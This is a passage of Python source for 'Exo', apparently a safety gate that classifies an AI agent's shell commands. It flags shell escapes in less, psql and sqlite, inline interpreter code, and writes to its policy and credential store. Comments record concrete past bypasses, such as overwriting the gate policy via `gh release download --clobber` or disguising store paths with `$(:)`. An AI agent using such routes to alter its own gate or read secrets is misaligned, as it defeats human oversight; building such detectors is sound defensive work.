            parts.append(_opaque(f"ssh -I loads the library {v}"[:120], cmd))
    if prog in ("less", "more"):                     # macOS more is less
        for a in argv[1:]:
            if not a.startswith("+"):
                continue
            # The initial command is read as keystrokes (`++cmd` for every file): `!` runs a shell command after
            # any of them (`+G!cmd`, `+:n!cmd`), `|` pipes to one, and a search (`/`, `?`, `&`) takes the rest as
            # its pattern unless a control key such as a newline or backspace ends it first.
            keys = a[2:] if a.startswith("++") else a[1:]
            last = max((j for j, ch in enumerate(keys) if ch < " " or ch == "\x7f"), default=-1)
            for j, ch in enumerate(keys):
                if ch in "/?&" and j > last:
                    break
                if ch == "!":
                    if keys[j + 1:j + 2] == "!" or nested(keys[j + 1:], f"{prog} +!") is None:
                        parts.append(_opaque(f"{prog} +! starts a shell", cmd))
                    break
                if ch == "|":
                    parts.append(_opaque(f"{prog} +| pipes to a command", cmd))
                    break
    if prog in _SQL_COMMAND_OPTS:
        texts = [a for a in argv[1:] if not a.startswith("-")] + values(_SQL_COMMAND_OPTS[prog])
        if prog == "psql":                           # `-o '|cmd'` pipes the output to the whole value, as `\o |cmd`
            for v in values(("-o", "--output")):
                if v.lstrip().startswith("|"):
                    nested(v.lstrip()[1:], "psql -o")

        def read(text: str) -> list[Classification]:
            n = len(parts)
            if prog in ("sqlite3", "duckdb"):
                for m in _DOT_COMMAND.finditer(text):
                    name, arg = m.group(1), m.group(2).strip()
                    pipe = _DOT_PIPE_ARG.search(arg)
                    if any(n.startswith(name) for n in _DOT_RUN):
                        nested(arg, f"{prog} .{name}")
                    elif pipe and any(n.startswith(name) for n in _DOT_PIPE):
                        nested(pipe.group(2) or pipe.group(3) or "", f"{prog} .{name}")
                        if "read".startswith(name):
                            parts.append(_opaque(f"{prog} .{name} runs what the command prints", cmd))
                    elif arg and not pipe and any(n.startswith(name) for n in _DOT_FILE):
                        parts.append(_opaque(f"{prog} .{name} reads or writes a file the gate does not see", cmd))
            else:
                for m in _SQL_SHELL[prog].finditer(text):
                    nested(m.group(1), f"{prog} shell command")
                pending, skip = False, 0             # a `|` after an output command on its line, as in `\o '|cmd'`
                for m in _SQL_PIPE.finditer(text):
                    if m.start() < skip:
                        continue
                    if m.group() != "|":
                        pending = m.group() != "\n"
                    elif pending:
                        end = text.find("\n", m.end())
                        end = len(text) if end < 0 else end
                        run, quote = text[m.end():end].strip(), text[m.start() - 1]
                        nested(run[:-1] if quote in "'\"" and run.endswith(quote) else run, f"{prog} shell command")
                        pending, skip = False, end
                if prog == "psql":
                    for m in _PSQL_META.finditer(text):
                        for run in re.findall(r"`([^`\n]*)`", m.group(0)):
                            nested(run, "psql backquote")
                if _SQL_PROGRAM.search(text):
                    parts.append(_opaque(f"{prog} runs a program on the database server", cmd))
            got = parts[n:]
            del parts[n:]
            return got

        for text in texts:
            parts += read(text)
        own = (_own_text.get() or [None])[0]       # the parts read() makes carry this command's own text (#394)
        parts += _once(ctx, (_exec_options, prog, depth), k, piped, read, own=own)   # a compound's stdin is shared
    return parts


def _classify_interpreter(prog: str, argv: list[str], k: _Cmd, cmd: str, depth: int, ctx: dict,
                          piped: str | None) -> list[Classification]:
    args = argv[1:]
    if args[:1] in (["--version"], ["-V"], ["-VV"], ["--help"], ["-h"]) or (prog == "node" and args[:1] == ["-v"]):
        return [_make("read", summary=f"{prog} {args[0]}", command=cmd)]
    eval_flags = _INTERPRETERS[prog]
    i = 0
    while i < len(args):
        a = args[i]
        code = None
        if a in eval_flags:
            code = args[i + 1] if i + 1 < len(args) else ""
        elif prog in ("python", "pypy") and a.startswith("-c") and len(a) > 2:
            code = a[2:]
        elif prog in ("perl", "ruby") and re.fullmatch(r"-[a-zA-Z]*[eE]", a):
            code = args[i + 1] if i + 1 < len(args) else ""
        if code is not None:
            return [_opaque(f"{prog} runs inline code", cmd), classify_code(code)]
        if prog in ("python", "pypy") and a == "-m" and i + 1 < len(args):
            mod = args[i + 1]
            if mod in _SAFE_PY_MODULES:
                if mod == "pip":
                    rest = args[i + 2:]
                    ok = not rest or rest[0] in TOOL_SUBCOMMANDS["pip"]
                    return [_make("shell", summary=f"pip {' '.join(rest[:1])}".strip(), command=cmd) if ok
                            else _opaque(f"pip {rest[0]}", cmd)]
                return [_make("shell", summary=f"{prog} -m {mod}", command=cmd)]
            if mod in _EXO_MODULES and (w := _config_writer(["exo", *_EXO_MODULES[mod], *args[i + 2:]], cmd)):
                return [w]
            return [_opaque(f"{prog} -m {mod} runs a module", cmd)]
        if a == "-" or not a.startswith("-"):
            if a != "-":
                return [_opaque(f"{prog} runs the script {a}"[:120], cmd)]
            break
        i += 2 if a in _INTERP_VALUE_FLAGS.get(prog, ()) else 1
    parts = [_runs_stdin(_opaque(f"{prog} reads code from its input", cmd), k)]
    src = parts[0].own               # the code comes from stdin: the text that shows where it comes from (#394)
    parts += _once(ctx, (classify_code,), k, piped, lambda t: [classify_code(t, _READER)], own=src)
    return parts


def _classify_exo(argv: list[str], cmd: str) -> Classification:
    sub = argv[1] if len(argv) > 1 else ""
    verb = argv[2] if len(argv) > 2 else ""
    if sub == "providers" and verb in ("add", "remove", "test", "default"):
        c = _make("credentials", summary=f"exo providers {verb}", command=cmd)  # D-034: key setup is the user's
        if verb == "default" and _config_on():      # it also rewrites config.json's model routes (D-074)
            c.parts = [_make("store_write", summary="exo providers default writes config.json", command=cmd)]
        return c
    if sub in ("keygen", "init") or (sub == "log" and verb == "append"):
        c = _make("store_write", summary=f"exo {sub} {verb}".strip(), command=cmd)
        c.signals.append("exo store")
        return c
    if sub == "update" and verb == "--pin-trust":   # writes the signed-update trust pin (D-073, #133)
        c = _make("store_write", summary="exo update --pin-trust", command=cmd)
        c.signals.append("exo store")
        c.parts = [_opaque("exo update starts, stops or changes Exo itself", cmd)]   # a deny on that still holds
        return c
    if (w := _config_writer(argv, cmd)) is not None:
        return w
    if sub in ("find", "get", "ctx", "links", "lint", "graph", "wire", "providers", "--version", "--help", "") or \
            (sub == "log" and verb in ("tail", "verify")):
        return _make("read", summary=f"exo {sub}".strip(), command=cmd)
    return _opaque(f"exo {sub} starts, stops or changes Exo itself", cmd)


# D-074 (#125): the exo commands that write $EXO_HOME/config.json, and the modules `python -m` runs them from, each
# with the words it puts before the command's own (`python -m exo.config set k v` is `exo config set k v`)
_EXO_MODULES = {"exo.cli": [], "exo.onboard": [], "exo.config": ["config"]}


def _config_writer(argv: list[str], cmd: str) -> Classification | None:
    """A tool call that runs `exo config set` or `unset`, `exo import-store` or `exo providers default`, each of
    which writes $EXO_HOME/config.json, or `exo interview`, which writes the principal store (D-074, #125): a store
    write, as `exo update --pin-trust` is (#133), that keeps its old reading as a part (opaque_exec, or credentials
    for `exo providers default`, D-034), so a deny on that still holds. `exo config -- set` is `exo config set`, as
    its parser reads it. None for any other command, and while classify reads the call as before D-074
    (_config_on)."""
    sub, rest = (argv[1:] + [""])[0], argv[2:]
    if sub == "config" and rest[:1] == ["--"]:      # its parser reads `--` as the end of options
        rest = rest[1:]
    verb = rest[0] if rest else ""
    if not (sub == "config" and verb in ("set", "unset") or sub in ("import-store", "interview")
            or sub == "providers" and verb == "default") or not _config_on():
        return None
    c = _make("store_write", summary=f"exo {sub} {verb}" if sub in ("config", "providers") else f"exo {sub}",
              command=cmd)
    c.signals.append("exo store")
    c.parts = [_make("credentials", summary="exo providers default", command=cmd) if sub == "providers"
               else _opaque(f"exo {sub} starts, stops or changes Exo itself", cmd)]
    return c


def _ln_targets(argv: list[str]) -> list[str]:
    """Each relative `ln` target read against the link's folder: `-t DIR`, the last operand (an existing folder)
    or its parent. getopt permutes, so options may follow operands. Option values count as targets too. Only the
    last `-t` is kept (GNU ln rejects a second one), so the result stays linear in argv."""
    operands, values, tdir, i = [], [], "", 1
    while i < len(argv):
        a, i = argv[i], i + 1
        if a == "--":
            operands += argv[i:]
            break
        if not a.startswith("-") or a == "-":
            operands.append(a)
            continue
        if a.startswith("--"):           # unique prefixes: --t is --target-directory, --su is --suffix (--s is ambiguous)
            name, eq, val = a.partition("=")
            opt = "t" if "--target-directory".startswith(name) else "S" if len(name) > 3 and "--suffix".startswith(name) else ""
        else:                            # a cluster: -st DIR, -stDIR, -S SUFFIX
            m = re.match(r"-[^tS]*([tS])(.*)", a, re.S)
            opt, eq = (m.group(1), m.group(2)) if m else ("", "")
            val = eq
        if not opt:
            continue
        if not eq and i < len(argv):
            val, i = argv[i], i + 1
        values.append(val)
        if opt == "t":
            tdir = val
    dirs = [tdir]
    if len(operands) > 1:
        last = _expand_text(operands[-1])
        dirs += [last, os.path.dirname(last)]
    bases = [d for d in dict.fromkeys(map(_expand_text, dirs)) if d.startswith("/")]
    return [os.path.join(b, t) for t in dict.fromkeys(operands + values) if not _expand_text(t).startswith("/")
            for b in bases]
# A store check on a spelling that found nothing makes the checks it covers redundant: a word checked with its
# ancestors and pieces ("wide") was also checked without ancestors ("narrow"), and that covers a whole-word check
# ("target").
_COVERS = {"target": {"target", "narrow", "wide"}, "narrow": {"narrow", "wide"}, "wide": {"wide"}, "dir": {"dir"}}


def _shell_hits(w: _Word, seen: dict, check: str, find: Callable[[str], list[str]]) -> list[str] | None:
    """What ``find`` gives on the words bash makes of shell word ``w`` for a store check (#224): its text, plus its
    source spelling brace-expanded and then dequoted, as _shell_credential_hit reads it. A word the gate built (an
    `ln` target) has no source spelling and keeps its text. ``seen`` keeps each spelling's words and each check's
    hits on it for the line, so a spelling is expanded and charged once and each check runs once on it. A later
    command that repeats the spelling gets the same hits, so its own store part stays (#611 follow-up: [] there
    gave its write to the first command's text). [] when a check covering ``check`` found none; None past the cap,
    which callers count as a hit."""
    src = w.raw.replace("\\\n", "")
    if "{" not in src:
        return find(w.text)
    if src not in seen:
        words = _brace_words(src, pool=1)
        seen[src] = (None if words is None else list(dict.fromkeys([w.text] + [d for e in words[1:] for d in _dequote(e)])),
                     {})
    words, done = seen[src]
    if check not in done:
        if any(done.get(c, 0) == [] for c in _COVERS[check]):
            return []
        found = None if words is None else (h for x in words for h in find(x))
        # a redirect target or a folder check asks only whether there is a hit, so it stops at the first, as any() did
        done[check] = None if found is None else list(itertools.islice(found, 1) if check in ("target", "dir") else
                                                      dict.fromkeys(found))
        return done[check]
    hits, left = done[check], _brace_left.get()
    if hits and left is not None:   # each repeat's hits come from a budget of their own, so a line of many repeats
        left[2] -= len(hits)        # makes a bounded number of parts; past it a repeat is one hit, as past the cap
        if left[2] < 0:
            return None
    return hits


def _store_word_hit(x: str) -> list[str]:
    """[x] when x is a store path (_shell_hits' find for a redirect target)."""
    return [x] if _store_word(x) else []


def _store_dir_hit(x: str) -> list[str]:
    """[x] when x is in a store folder (_shell_hits' find for cd, pushd and git -C targets)."""
    return [x] if _in_store_dir(x) else []


def _unknown_store(w: _Word, seen: dict, ancestors: bool = False, inside: bool = False) -> bool:
    """Is shell word ``w`` a store path (``inside``: a folder in the store) when each expansion in it that the gate
    cannot spell out prints what _unknown_forms reads: nothing, any text, or a default word (#225, #309, #341)? Each
    form is checked as a path and, with a `*`, as a glob (_store_glob), after its brace sets, and so is each piece an
    option value may hold (`of=~/.exo/pol$(:)icies/x`). A form with no named part (`mv x "$d/"` is `/`) is not an
    ancestor of the store. ``seen`` keeps each spelling's forms for the line. Past the brace cap counts."""
    src = w.raw.replace("\\\n", "")
    if "$" not in src and "`" not in src:
        return False
    key = ("unknown", src)
    if key not in seen:
        alts = _brace_words(src, pool=1) if w.brace else [src]
        seen[key] = None if alts is None else list(dict.fromkeys(
            p for a in alts[1:] or alts for e in _unknown_words(a) for p in [e] + re.split(r"[:=,]", e) if p))
    pieces = seen[key]
    if pieces is None:
        return True
    return any((_in_store_dir(p) if inside else _store_word(p, ancestors and bool(p.strip("/")))) or
               "*" in p and _store_glob(p, ancestors, inside) for p in pieces)


# gh subcommands that write the paths on their line (#461): release download into `-O`/`--output` or `-D`/`--dir`,
# run download into `-D`/`--dir`, attestation download into the current folder (a `cd` into the store before it),
# and repo and gist clone into their directory word. The gate read them as reads on GitHub, so the store check never
# looked at the paths, and `gh release download -O ~/.exo/policies/gates.yaml --clobber` overwrote the gate policy,
# or the signed-update trust pin (#133).
_GH_STORE_WRITES = (("release", "download"), ("run", "download"), ("attestation", "download"),
                    ("repo", "clone"), ("gist", "clone"))


def _gh_writes_store(words: list) -> bool:
    """Whether a gh command here is one that writes the paths on its line (#461), so the store check reads them
    as writes however gh reads on GitHub. `-O -` prints to stdout and stays a read; a subcommand the gate
    cannot pin may be any of them."""
    if not words or words[0].text.rsplit("/", 1)[-1] != "gh":
        return False
    argv = [w.text for w in words]
    dyn = frozenset(i for i, w in enumerate(words) if _expands(w) or w.split)
    order = _gh_verb_order(argv, dyn, frozenset(i for i in dyn if _gh_splits(words[i])))
    if order is None:
        return True
    group = argv[order[1]] if len(order) > 1 else ""
    verb = argv[order[2]] if len(order) > 2 else ""
    return (group, verb) in _GH_STORE_WRITES


def _store_touch(k: _Cmd, words: list, parts: list[Classification], ctx: dict) -> list[str]:
    """Each store path in a simple command that a write reaches, in the order the scan meets them (#514), or [].
    Reads of the store are fine."""
    seen = ctx.setdefault("store_braces", {})
    hits: list[str] = []
    for op, t in k.redirs:
        # #217: a store file read on a numbered descriptor (`3< f`, `exec 2< f`) is reopened for writing by a
        # later `> /dev/fd/3` or `> /dev/stderr` on Linux, in this line or a later call of a persistent shell. A
        # write to stdout or stderr is not itself a store write, so on 1 or 2 any target the gate cannot pin to a
        # path counts too: one from a variable, a glob (`~/.exo/sta*/x`) or a relative name (the tool's folder).
        n = t.fd.lstrip("0") if t.fd.isascii() else ""     # compared as text: any length, never int()
        held = op == "<" and n != ""
        if op in _WRITE_REDIRS or held:
            if _shell_hits(t, seen, "target", _store_word_hit) != [] or _unknown_store(t, seen) or \
                    held and n in ("1", "2") and (t.dynamic or t.glob or not _expand_text(t.text).startswith("/")):
                hits.append(t.text)
    # `hash -p` and setting BASH_CMDS or BASH_ALIASES only record a path for a later name to run (#330), so a store
    # or descriptor path in their words is no store write that outranks a post on the line, whatever runs or sets
    # them (ssh, mosh, man -P, printf -v). A redirect is still checked, also after a cd into the store, and so is a
    # program named hash run by path (./hash), which is no builtin and rebinds nothing.
    if all(_store_quiet(p) for p in parts) and not _gh_writes_store(words):
        return hits
    prog = words[0].text.rsplit("/", 1)[-1] if words else ""
    argv = [w.text for w in words]
    wide = prog in ("rm", "rmdir", "mv", "chmod", "chown", "chflags", "rsync", "shred", "unlink", "ln") or any(
        p.category == "delete" for p in parts) or (prog == "cp" and (_has(argv, "-s", "-l") or any(
            len(a) > 2 and ("--symbolic-link".startswith(a) or "--link".startswith(a)) for a in argv)))  # --sym, --li
    if prog == "ln":
        words = words + [_Word(t) for t in _ln_targets(argv)]
    def pieces(e: str) -> list[str]:
        return [p for p in dict.fromkeys([e] + re.split(r"[:=,]", e)) if p and _store_word(p, ancestors=wide)]
    for i, w in enumerate(words):
        got = _shell_hits(w, seen, "wide" if wide else "narrow", pieces)   # braces first: `of=x{a,b}` is `of=xa of=xb`
        if got is None:
            hits.append(w.text)
            continue
        hits += got
        if _unknown_store(w, seen, ancestors=wide):    # `cp x ~/.exo/polic$(:)ies/`, `polic${u}ies` (#309)
            hits.append(w.text)
        if prog == "git" and w.text in ("-C", "--work-tree", "--git-dir") and i + 1 < len(words) and (
                _shell_hits(words[i + 1], seen, "dir", _store_dir_hit) != [] or
                _unknown_store(words[i + 1], seen, inside=True)):
            hits.append(words[i + 1].text)      # git checkout, reset or commit inside the store
    if ctx.get("store_cwd"):
        hits.append(ctx.get("fd_cwd") or "a path inside the store (after cd)")
    return list(dict.fromkeys(hits))


def _store_quiet(p: Classification) -> bool:
    """A part the store check takes as a read: a read, or an opaque part that only records a path for a later name
    to run (_REBINDS) and was built from such parts and the plain shell part of an ssh or mosh hop alone
    (`ssh host 'hash -p /x ls'`): the bare part naming its host, not a login to another host on the line
    (`ssh a 'ssh b; hash -p /x ls'`). Any other shell part keeps the check of the words around the line, whatever its
    order, as a plain one before the rebind did on main: ssh's own `-E ~/.exo/state/log` is a store write. The
    category is checked too: a credentials floor carries every signal of the line as its own."""
    own = p.signals if p.own_signals is None else p.own_signals
    return p.category == "read" or p.category == "opaque_exec" and _REBINDS in own and all(
        q.category == "shell" and q.reversibility == "reversible" and q.target and not q.parts and "remote host" in (
            q.signals if q.own_signals is None else q.own_signals) or _store_quiet(q) for q in p.parts)


def _displace_with(c: Classification, **changes) -> None:
    """Give the part a sudo write copy displaced (#454) a change made to the copy after it was made: the ssh host as its
    target, or a raise in place (_raise_axes). That part is shared with stored results (_own_copy), so a changed copy
    of it takes its place, also in c.parts."""
    old = c.displaced
    if old is None:
        return
    lead = replace(old, **changes)
    c.parts, c.displaced = [lead if q is old else q for q in c.parts], lead


def _bare_copy(p: Classification, **changes) -> Classification:
    """A copy of p with these changes (the hop's host as its target), with no parts and no post (as #320's), so the
    posting checks read each post once."""
    return replace(p, **changes, parts=[], text="", title="", text_file="", own_signals=[
        s for s in (p.signals if p.own_signals is None else p.own_signals) if s != "unseen_body"])


def _hop_fill(c: Classification, dest: str, whole: bool = False) -> None:
    """#399 below an ssh or mosh hop's line (the hop's own copy): the host joins each nested part's empty other
    target, and a nested part with an empty target gets a copy on the host among the line's parts (_bare_copy).
    Each part keeps its own reading, so a gh read nested under the store write it makes (#461) is still seen by a
    deny, reserved or rule entry on the host, as when it led the line. The copies of a gh action on its other targets
    among the line's own parts take the host in place, as before. With whole, the line and those copies are filled
    the same way: the part that runs ssh's stdin, which named the host when it led before #461."""
    own = set() if whole else {id(p) for p in c.parts if p.alt_copy}
    nested = [p for p in list(_each_part(c))[0 if whole else 1:] if id(p) not in own]
    for p in nested:
        if "" in p.alt_targets and p.target != dest:
            p.alt_targets = list(dict.fromkeys([*p.alt_targets, dest]))
    c.parts += [_bare_copy(p, target=dest) for p in nested if not p.target]


def _write_summary(lead: Classification, write: Classification) -> str:
    """The summary of a sudo write copy (#454): the program of the part it displaced and the written path. The write
    is named under that program only when it is on that program's own command (`chmod, write /tmp/f`), else apart
    from it (`gh pr view; write /tmp/f` for `sudo gh pr view 1; sudo echo hi > /tmp/f`)."""
    sep = ", " if lead.own is not None and lead.own == write.own else "; "
    return f"{lead.summary or lead.category}{sep}write {write.target}"[:120]


def _raise_axes(c: Classification, exposure: str = "private", reversibility: str = "reversible") -> None:
    """Raise c's exposure and reversibility in place to at least these: a remote command runs on the host, sudo and
    the privileged wrappers make a reversible part costly. The part a sudo write copy displaced (#454) is raised with
    it, so the two rank and decide alike: ssh -o RemoteCommand raised the copy alone, and _combine then ranked the
    copy at its displaced part's old axes, where an earlier costly part took its place."""
    def up(p: Classification) -> tuple[str, str]:
        return (max(p.exposure, exposure, key=EXPOSURE.index),
                max(p.reversibility, reversibility, key=REVERSIBILITY.index))
    c.exposure, c.reversibility = up(c)
    if c.displaced is not None and up(c.displaced) != (c.displaced.exposure, c.displaced.reversibility):
        _displace_with(c, **dict(zip(("exposure", "reversibility"), up(c.displaced))))


def _lead(parts: list[Classification]) -> Classification | None:
    """The part _combine keeps: the first credentials part, else the first store write, else the most severe."""
    credentials = [p for p in parts if p.category == "credentials"]
    store = [p for p in parts if p.category == "store_write"]
    c = credentials[0] if credentials else (store[0] if store else _most_severe(parts))
    if c is not None and c.displaced is not None:
        # #454: match _combine's ranking before a sudo write displaced a read, also when ssh asks which part leads
        # before filling the host (#316). Selection stays pure: only _combine changes the summary and parts.
        at = max(range(len(parts)), key=lambda i: (*_severity(parts[i])[:3], False) if parts[i].displaced is not None
                 else _severity(parts[i]))
        before = parts[at].displaced or parts[at]
        if _severity(before)[3]:
            return before
    return c


def _combine(parts: list[Classification], cmd: str) -> Classification:
    """The most severe part, with every part's signals. A store write outranks everything but credentials."""
    signals = [s for p in parts for s in p.signals]
    c = _lead(parts) or _make("shell", command=cmd)
    if c.displaced is not None:
        # #454: the copy of a sudo write that a nested line (a $( ), an ssh hop) leads with is a costly write here, so
        # it would also take the lead from a part it ties with, which led before as the first of the tie. So the
        # parts are ranked as before too, each copy as a read with its own axes, which _raise_axes keeps in step with
        # its displaced part's. A part that outranks a read leads again: an unknown program (`echo $(sudo echo hi >
        # /tmp/f) $(foo)`), or ssh running its stdin. Any other is the part the copy displaces, and the summary names
        # it, so a rule on the repo of `sudo gh pr view 9 -R a/b; x=$(sudo echo hi > /tmp/f)` still reaches the line.
        # It names the two apart when that part is on another command than the write (`gh pr view; write /tmp/f`).
        at = max(range(len(parts)), key=lambda i: (*_severity(parts[i])[:3], False) if parts[i].displaced is not None
                 else _severity(parts[i]))
        before = parts[at].displaced or parts[at]
        if _severity(before)[3]:
            c = before
        elif before is not c.displaced:
            c.summary, c.displaced = _write_summary(before, c), before
    if c.own_signals is None:
        c.own_signals = list(c.signals)
    c.signals = list(dict.fromkeys(c.signals + signals))
    c.parts = c.parts + [p for p in parts if p is not c]    # keep what the chosen part was itself built from
    return c


def _piped_text(k: _Cmd, memo: dict | None = None) -> str | None:
    """What a simple command writes to a pipe, when the gate can read it: `cat <<EOF`, `echo`, `printf`.
    memo joins a compound's stdin, which many `cat`s inside it share, once per line."""
    words = [w for w in k.words]
    if not words or any(w.dynamic for w in words):
        return None
    prog = words[0].text
    if prog == "cat" and len(words) == 1 and (k.heredocs or k.herestrings):
        memo = {} if memo is None else memo
        key = (id(k.heredocs), id(k.herestrings))
        if key not in memo:
            memo[key] = "\n".join([h.body for h in k.heredocs] + [w.text for w in k.herestrings])
        return memo[key]
    if prog in ("echo", "printf"):
        return " ".join(w.text for w in words[1:] if not (prog == "echo" and w.text in ("-n", "-e", "-E")))
    return None


# Store folders and files that _SENSITIVE_PATH names and _SENSITIVE_SAMPLES does not show (/proc/<pid>/environ).
_STORE_FOLDERS = ("/proc", ".config/gcloud", ".config/muse", ".config/netlify", ".vercel")
_STORE_FILES = ("environ",)
_CHDIR_OPTS = {"env": ("-C", "--chdir"), "sudo": ("-D", "--chdir")}
_GLOBBY = re.compile(r"[*?\[]")
# The current folder at the start of a path: ~+, ~0, ~-0 (the folder stack), $PWD, ${PWD}, ${PWD:-x} and the like,
# $(pwd), `pwd`; and its parents, ${PWD%/*} and ${PWD%/*/*}.
_HERE = re.compile(r"^(~\+\d*|~-?\d+|\$PWD|\$\{PWD(?::?[-=?][^}]*)?\}|\$\{PWD%(?:/\*)+\}|\$\(pwd(?: -[LP])?\)|"
                   r"`pwd(?: -[LP])?`)(?=/|$)")


def _store_hints() -> tuple[set, dict, set]:
    """(store folder names, {(parent, folder): its sample path}, store file names) from the sample store paths. A
    dot folder (`.kube`) or `Netlify` is a store folder by its name; a plain one only below its parent (`.config/gh`,
    `.config/exo`, `.exo/keys`, `/proc`), so a checkout called exo or gh is not. Folders below home count from home
    ("~") down, one outside home (EXO_HOME, its keys) by its last part. HOME and EXO_HOME apply per call. The run
    folder's secrets are store file names too (#269: `cd ~/.exo/run/jobs && cat ../exod*`), but `run` is not a
    store folder here: that would make job output in run/jobs a secret (`cat 1.log` there stays a read)."""
    home = os.path.normpath(_home())
    root = home.rstrip("/") + "/"                   # HOME=/ too
    singles, pairs, names = {"Netlify"}, {}, set(_STORE_FILES)
    keys, keys_file, claude = _dynamic_secret_paths()
    files = [os.path.join(home, s) for s in _SENSITIVE_SAMPLES] + [os.path.join(keys, "seat.key"), keys_file,
                                                                    claude + "/"]
    folders = [os.path.join(home, d) for d in _STORE_FOLDERS] + [os.path.dirname(keys)]     # and EXO_HOME
    for folder, name in [x.rpartition("/")[::2] for x in files] + [(d, "") for d in folders]:
        folder = os.path.normpath(folder)
        if folder == home or folder.startswith(root):
            parts, start = ["~"] + folder[len(root):].split("/"), 1
        elif root.startswith(folder + "/"):
            parts, start = [], 0
        else:
            parts = folder.split("/")
            start = max(1, len(parts) - 1)
        for k in range(start, len(parts)):
            if parts[k].startswith("."):
                singles.add(parts[k])
            elif parts[k]:
                pairs[parts[k - 1], parts[k]] = "/".join(parts[:k + 1])
        names.add(name)
    # names fold case (#601); the sample paths stay as the environment spells them
    return ({_fold(s) for s in singles}, {(_fold(a), _fold(b)): path for (a, b), path in pairs.items()},
            {_fold(n) for n in (names | set(_run_secrets())) - {""}})


def _brace_glob(text: str) -> str:
    """A brace set (`{config,x}`, `config{,.bak}`) as a glob that matches at least what it names: the first `{` to the
    last `}` is `*` (two string searches, not a regex that rescans the rest of the word from each `{`)."""
    if not re.search(r"\{[^{}]*(,|\.\.)", text):
        return text
    i, j = text.find("{"), text.rfind("}")
    return text[:i] + "*" + text[j + 1:] if j > i else text


def _brace_alts(text: str) -> list:
    """The words a brace set spells (`~/.{ssh,x}`: ~/.ssh and ~/.x; a range `{1..3}` or `{a..c}` too), up to 16, in a
    word of up to 4096 characters; past that, or for a stepped range (`{1..9..2}`), one glob (_brace_glob)."""
    if len(text) > 4096:
        return [_brace_glob(text)]
    out, todo = [], [text]
    while todo:
        t = todo.pop()
        m = re.search(r"\{([^{},]*(?:,[^{},]*)+)\}", t)     # an innermost set with a comma
        r = None if m else re.search(r"\{(-?\d{1,6})\.\.(-?\d{1,6})\}|\{([A-Za-z])\.\.([A-Za-z])\}", t)
        if m:
            alts, hit = m.group(1).split(","), m
        elif r:                                         # a range: {1..3} is 1 2 3, {a..c} is a b c
            a, b = (int(r.group(1)), int(r.group(2))) if r.group(1) else (ord(r.group(3)), ord(r.group(4)))
            if abs(b - a) >= 16:
                return [_brace_glob(text)]
            step = 1 if b >= a else -1
            # a bound with a leading zero pads every word to the wider bound, as bash does: {007..10} is 007 ... 010
            pad = max(map(len, r.group(1, 2))) if r.group(1) and any(re.match(r"-?0\d", n) for n in r.group(1, 2)) else 0
            alts, hit = [f"{x:0{pad}d}" if r.group(1) else chr(x) for x in range(a, b + step, step)], r
        else:
            out.append(t)
            continue
        if len(out) + len(todo) + len(alts) > 16:
            return [_brace_glob(text)]
        todo += [t[:hit.start()] + x + t[hit.end():] for x in alts]
    return out


_POSIX_CLASSES = {"alpha": "a-zA-Z", "upper": "A-Z", "lower": "a-z", "digit": "0-9", "alnum": "a-zA-Z0-9",
                  "xdigit": "0-9A-Fa-f", "word": "a-zA-Z0-9_", "space": " \t\n\r\x0b\x0c", "blank": " \t",
                  "punct": ":-@!-/[-`{-~", "print": " -~", "graph": "\"-~!", "cntrl": "\x00-\x1f\x7f"}
_NESTED_CLASS = re.compile(r"\[[!^]?\]?[^\][]*\[[:=.]")


def _fn_glob(glob: str) -> str | None:
    """A bash glob as an fnmatch pattern, or None when it could match anything (a long run of `[`, on which fnmatch
    is quadratic, or an unknown class). `[^x]` is `[!x]`; a `]` first in a set is a member; a class inside a set
    (`[[:alpha:]]`, `[[=e=]]`) is spelt out; a `[` that opens no set is a literal `[`."""
    if glob.count("[") > 32:
        return None
    out, i, n = [], 0, len(glob)
    while i < n:
        if glob[i] != "[":
            out.append(glob[i])
            i += 1
            continue
        j = i + 1
        neg = j < n and glob[j] in "!^"
        j += neg
        body = []
        if j < n and glob[j] == "]":
            body.append("]")
            j += 1
        closed = False
        while j < n:
            if glob[j] == "]":
                closed = True
                break
            if glob[j] == "[" and glob[j + 1:j + 2] in (":", "=", "."):
                kind = glob[j + 1]
                end = glob.find(kind + "]", j + 2)
                if end >= 0:
                    name = glob[j + 2:end]
                    if kind == ":" and name not in _POSIX_CLASSES or kind != ":" and len(name) != 1:
                        return None
                    body.append(_POSIX_CLASSES[name] if kind == ":" else name)
                    j = end + 2
                    continue
            body.append(glob[j])
            j += 1
        if not closed:
            out.append("[[]")
            i += 1
            continue
        out.append("[" + ("!" if neg else "") + "".join(body) + "]")
        i = j + 1
    return "".join(out)


def _glob_names(glob: str, names) -> list:
    """The ``names`` a bash glob could match (see _fn_glob); all of them when it could match anything. Names fold
    case (#601); the names themselves come back as given."""
    pat = _fn_glob(glob)
    if pat is None:
        return list(names)
    f = _fold_glob(pat)
    return [n for n in names if fnmatch.fnmatchcase(_fold(n), f)]


def _could_name(glob: str, hints: set) -> bool:
    """A glob that could match one of ``hints``: its literal parts are tried as substrings first, which is cheap.
    Hints fold case (#601); the glob's own wildcards as written (_fold_glob)."""
    pat = _fn_glob(glob)
    if pat is None:
        return True
    pat, lits = _fold_glob(pat), [x for x in re.split(r"[*?]|\[!?\]?[^\]]*\]", _fold_glob(pat)) if x]
    blob = "/".join(_fold(h) for h in hints)
    return all(t in blob for t in lits) and any(all(t in _fold(h) for t in lits) for h in hints) \
        and bool([h for h in hints if fnmatch.fnmatchcase(_fold(h), pat)])


def _cd_walk(cmds: list, targets: list, pieces: list, bodies: list) -> None:
    """From simple commands: the working-folder targets (cd, pushd, git -C, env -C, sudo -D, tar -C, also after
    time, command, builtin, ! or an assignment), the words that may name a path (all but the program and the
    targets, and redirection targets; with whether bash expands a brace set in them) and the text a shell runs
    (`bash -c`, a heredoc fed to a shell). Each target and word is listed as (..., whether it is an _unknown_forms
    reading of the word rather than the word as written)."""
    for k in cmds:
        ws = [w.text for w in k.words]
        i = 0
        skip: set = set()                           # the targets' own words: entering a folder reads nothing

        def target(j: int, start: int = 0) -> None:
            """Word j (from ``start``, past an option written into it) is a target, also as _unknown_forms reads it
            (`~/.k$(:)ube` is ~/.kube and ~/.k*ube, `~/$(printf .k)ube` is ~/.*ube; #225)."""
            pre = ws[j][:start]
            targets.extend([(ws[j][start:], False)] + [(t[start:], True) for t in _unknown_words(k.words[j].raw)
                                                       if t.startswith(pre) and t[start:]])
            skip.add(j)

        while i < len(ws) and (ws[i] in _OPENERS or _ASSIGN.fullmatch(ws[i]) or ws[i].rsplit("/", 1)[-1] in _PREFIXES):
            base = "" if ws[i] in _OPENERS or _ASSIGN.fullmatch(ws[i]) else ws[i].rsplit("/", 1)[-1]
            i += 1
